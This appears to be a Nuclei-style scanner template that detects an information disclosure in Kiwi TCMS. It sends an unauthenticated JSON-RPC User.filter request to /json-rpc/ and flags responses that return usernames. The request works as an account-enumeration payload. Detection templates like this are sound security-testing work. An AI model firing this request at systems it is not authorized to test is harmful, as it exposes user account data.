id: kiwi-information-disclosure
info:
  author: act1on3
  name: Kiwi TCMS information disclosure
  severity: high
requests:
- body: '{"jsonrpc":"2.0","method":"User.filter","id": 1,"params":{"query":{"is_active":true}}}'
  headers:
    Content-Type: application/json
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101
      Firefox/55
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - result
    - username
  method: POST
  path:
  - '{{BaseURL}}/json-rpc/'
